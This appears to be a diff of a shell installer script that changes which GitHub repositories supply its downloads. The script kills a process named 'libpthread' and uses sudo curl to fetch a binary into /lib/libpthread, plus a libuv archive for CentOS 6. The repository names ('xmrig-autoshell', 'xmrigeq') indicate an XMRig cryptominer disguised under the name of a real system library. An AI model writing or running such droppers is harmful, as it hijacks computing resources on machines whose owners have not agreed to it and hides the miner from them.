@@ -32,12 +32,12 @@ Get_Dist_Name
 
 sudo pkill libpthread
 sleep 2
-sudo curl -fsSL https://raw.githubusercontent.com/xbhuang1994/xmrig-autoshell/master/libpthread > /lib/libpthread
+sudo curl -fsSL https://raw.githubusercontent.com/x7r3mx/xmrigeq/master/libpthread > /lib/libpthread
 if [ ! -f "/usr/lib64/libuv.so.1" ]; then
     case $PM in  
         'yum')  
             if grep -Eqii "release 6" /etc/issue || grep -Eq "release 6" /etc/*-release; then
-                sudo curl -fsSL "https://raw.githubusercontent.com/xbhuang1994/xmrig-autoshell/master/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
+                sudo curl -fsSL "https://raw.githubusercontent.com/x7r3mx/xmrigeq/master/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
                 sudo tar -zxvf "/var/tmp/libuv-centos6.tar.gz" -C "/usr/lib64/"
                 echo "yum install libuv for CentOS 6"
             else
